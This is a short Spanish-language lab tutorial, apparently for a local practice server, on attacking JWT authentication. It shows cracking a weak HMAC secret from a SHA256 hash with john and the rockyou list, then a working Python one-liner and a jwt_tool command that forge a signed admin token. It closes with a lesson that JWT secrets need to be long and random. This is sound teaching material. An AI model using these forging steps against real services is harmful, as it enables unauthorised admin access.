## Crackear el secret

El endpoint `/crack` te da un hash SHA256 del secret:

```bash
curl http://127.0.0.1:18094/crack
# {"hash": "e88040e7d0052...", "hint": "common phrase, rockyou top 1000"}

# Crack con hashcat o john:
echo 'e88040e7d0052eeb5dcf0fd834e4835ff329b275e6a9889058e8d16c38da9514' > hash.txt
john --wordlist=rockyou.txt --format=raw-sha256 hash.txt
# Resultado: jwt_secret
```

## Forjar un token firmado

Ahora que conoces el secret (`jwt_secret`), puedes firmar tokens VÁLIDOS:

```bash
# Con Python:
python3 -c "
import hmac, hashlib, base64, json

secret = 'jwt_secret'
header = base64.urlsafe_b64encode(json.dumps({'alg':'HS256','typ':'JWT'}).encode()).rstrip(b'=').decode()
payload = base64.urlsafe_b64encode(json.dumps({'user':'admin','role':'admin','exp':9999999999}).encode()).rstrip(b'=').decode()
sig = base64.urlsafe_b64encode(hmac.new(secret.encode(), f'{header}.{payload}'.encode(), hashlib.sha256).digest()).rstrip(b'=').decode()
print(f'{header}.{payload}.{sig}')
"

# O con la herramienta jwt-tool:
python3 jwt_tool.py <original_token> -S hs256 -pc role -pv admin -p Secret jwt_secret
```

## La comparación: secret fuerte

El endpoint `/strong` usa un secret de 50+ caracteres aleatorios:

```bash
curl http://127.0.0.1:18094/strong
# Intenta crackear ese hash — no lo harás en la vida del universo
```

**Lección**: los secrets JWT deben ser LARGOS (256 bits+) y aleatorios. Un secret
de diccionario convierte tu "autenticación segura" en papel mojado.
